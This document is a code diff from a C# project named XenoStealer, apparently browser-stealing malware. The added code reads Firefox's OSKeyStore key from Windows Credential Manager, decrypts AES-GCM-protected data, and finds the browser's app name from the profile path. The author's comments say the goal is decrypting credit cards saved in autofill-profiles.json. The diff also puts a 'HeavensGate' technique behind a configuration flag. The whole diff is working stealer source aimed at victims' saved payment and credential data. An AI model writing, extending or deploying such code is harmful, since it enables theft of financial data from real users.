@@ -65,6 +65,8 @@ namespace XenoStealer
 
         private void Init(string GeckoResourcePath) 
         {
+            //whatever the fuck firefox did in their latest update broke heavensgate working with their nss3 dll. so I have it disabled in the Configuration until i can figure that out.
+
             if (!GeckoResourcePath.EndsWith("\\"))
             {
                 GeckoResourcePath = GeckoResourcePath + "\\";
@@ -81,7 +83,7 @@ namespace XenoStealer
             }
             else if (!Environment.Is64BitProcess && !GeckoResourcePath.Contains("x86")) //32 && 64, pass.
             {
-                if (!HeavensGate.operational) //heavensGate needs to be operational to do this.
+                if (!Configuration.UseHeavensGateOnGecko || !HeavensGate.operational) //heavensGate needs to be allowed and operational to do this.
                 {
                     return;
                 }
@@ -526,6 +528,94 @@ namespace XenoStealer
                 GeckoResourcePath = GeckoResourcePath + "\\";
             }
             return File.Exists(GeckoResourcePath + "nss3.dll") && File.Exists(GeckoResourcePath + "mozglue.dll");
+        }
+
+        //goal: make OSkeyStore decryptor so i can decrypt credit cards
+        //cc data is stored in autofill-profiles.json
+        //https://searchfox.org/mozilla-central/source/mozglue/misc/PreXULSkeletonUI.cpp line 340, proves we can extract the MOZ_APP_BASENAME from the path.
+        //https://github.com/mozilla/gecko-dev/blob/8ff5dcf8778644a7226a00f580968f85ed7bd997/security/manager/ssl/NSSKeyStore.cpp#L133
+        //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/OSKeyStore.cpp#L601 and ^ shows us how to decrypt these values.
+        //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/CredentialManagerSecret.cpp#L92 shows us how to get the decryption key. (windows only)
+        //https://github.com/mozilla/gecko-dev/blob/master/toolkit/modules/OSKeyStore.sys.mjs#L43 proves how the label is created (name to get key?) (MOZ_APP_BASENAME + " Encrypted Storage")
+
+        private static byte[] GetOsKeyStoreKey(string MOZAPPBASENAME) 
+        {
+            string aLabel = MOZAPPBASENAME + " Encrypted Storage";
+            //https://github.com/mozilla/gecko-dev/blob/master/toolkit/modules/OSKeyStore.sys.mjs#L43 proves how the label is created (name to get key?) (MOZ_APP_BASENAME + " Encrypted Storage")
+            if (!NativeMethods.CredReadW(aLabel, CRED_TYPE.GENERIC, 0, out IntPtr credentialPtr))
+            {
+                return null;
+            }
+            //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/CredentialManagerSecret.cpp#L92 shows us how to get the decryption key. (windows only)
+            InternalStructs.CREDENTIALW credData = Marshal.PtrToStructure<InternalStructs.CREDENTIALW>(credentialPtr);
+            byte[] credBuffer = new byte[credData.credentialBlobSize];
+            Marshal.Copy(credData.credentialBlob, credBuffer, 0, credBuffer.Length);
+            NativeMethods.CredFree(credentialPtr);
+            return credBuffer;
+        }
+
+        public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, byte[] EncryptedData) 
+        {
+            byte[] key = GetOsKeyStoreKey(MOZAPPBASENAME);
+            if (key == null) 
+            {
+                return null;
+            }
+
+            //https://github.com/mozilla/gecko-dev/blob/8ff5dcf8778644a7226a00f580968f85ed7bd997/security/manager/ssl/NSSKeyStore.cpp#L133
+            //https://github.com/mozilla/gecko-dev/blob/master/security/manager/ssl/OSKeyStore.cpp#L601 and ^ shows us how to decrypt these values.
+
+            byte[] iv = new byte[12];
+            Array.Copy(EncryptedData, 0, iv, 0, 12);
+
+            // Determine the lengths of buffer and tag
+            int bufferLength = EncryptedData.Length - 12;
+            byte[] Buffer = new byte[bufferLength];
+            Array.Copy(EncryptedData, 12, Buffer, 0, bufferLength);
+
+            // Extract the tag and data from Buffer
+            int tagLength = 16;
+            byte[] tag = new byte[tagLength];
+            byte[] data = new byte[bufferLength - tagLength];
+            Array.Copy(Buffer, bufferLength - tagLength, tag, 0, tagLength);
+            Array.Copy(Buffer, 0, data, 0, bufferLength - tagLength);
+
+            return AesGcm.Decrypt(key, iv, null, data, tag);
+
+        }
+
+        public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, string cypherText)
+        {
+            try
+            { 
+                return OsKeyStoreDecrypt(MOZAPPBASENAME, Convert.FromBase64String(cypherText));
+                
+            }
+            catch { }
+            return null;
+        }
+
+        public static string GetMOZAPPBASENAMEFromProfilePath(string profilePath)
+        {
+            //https://searchfox.org/mozilla-central/source/mozglue/misc/PreXULSkeletonUI.cpp line 340, proves we can extract the MOZ_APP_BASENAME from the profile path.
+            string root = Directory.GetDirectoryRoot(profilePath);
+
+            while (true)
+            {
+                if (!File.Exists(Path.Combine(profilePath, "profiles.ini")))
+                {
+                    if (string.Equals(profilePath, root, StringComparison.OrdinalIgnoreCase))
+                    {
+                        return null;
+                    }
+                    profilePath = Path.Combine(profilePath, "..");
+                    profilePath = Path.GetFullPath(profilePath);
+
+                    continue;
+                }
+
+                return new DirectoryInfo(profilePath).Name;
+            }
         }
 
         public void Dispose() 
